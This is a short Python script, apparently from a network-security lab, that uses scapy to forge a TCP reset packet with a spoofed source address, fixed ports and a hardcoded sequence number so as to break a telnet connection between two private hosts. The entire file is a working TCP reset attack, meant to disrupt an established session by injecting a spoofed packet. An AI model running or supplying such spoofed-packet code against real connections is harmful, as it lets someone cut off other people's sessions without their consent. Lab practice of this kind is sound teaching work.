import sys
from scapy.all import *

print("sending reset packet...")
IPLayer = IP (src="10.10.10.194", dst = "10.10.10.195")
TCPLayer = TCP (sport=60512, dport=23, flags="R", seq=2248962690)
pkt=IPLayer/TCPLayer
ls(pkt)
send(pkt,verbose=0)
